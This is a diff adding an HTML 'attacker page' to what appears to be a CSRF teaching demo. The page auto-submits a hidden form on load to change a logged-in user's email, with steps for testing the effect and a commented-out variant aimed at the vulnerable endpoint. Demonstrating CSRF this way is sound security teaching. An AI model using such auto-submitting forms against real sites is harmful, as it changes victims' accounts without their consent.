@@ -1,0 +1,42 @@
+<!-- attacker.html -->
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Attacker Page</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h2>⚠️ Malicious Page</h2>
+    
+    <div class="alert warning">
+      <strong>Warning:</strong> This page will attempt to change a victim's email if they are logged in to the demo app.
+    </div>
+
+    <p>This demonstrates a Cross-Site Request Forgery (CSRF) attack. When you open this page while logged into the vulnerable demo app, it will silently submit a form to change your email address.</p>
+
+    <!-- <form id="attackForm" action="update_vulnerable.php" method="POST">
+      <input type="hidden" name="email" value="hacked-by-attacker@example.com">
+    </form> -->
+    <form id="attackForm" action="update_secure.php" method="POST">
+      <input type="hidden" name="email" value="hacked-by-attacker@example.com">
+    </form>
+
+    <script>
+      
+      window.onload = function() {
+        document.getElementById('attackForm').submit();
+      };
+    </script>
+
+    <p style="margin-top: 30px;" class="text-muted"><strong>How to test:</strong></p>
+    <ol style="margin-left: 20px; color: #666;">
+      <li>Login to the demo app first</li>
+      <li>Keep the demo tab open</li>
+      <li>Open this page in another tab while still logged in</li>
+      <li>Check if your email was changed without your consent</li>
+    </ol>
+  </div>
+</body>
+</html>
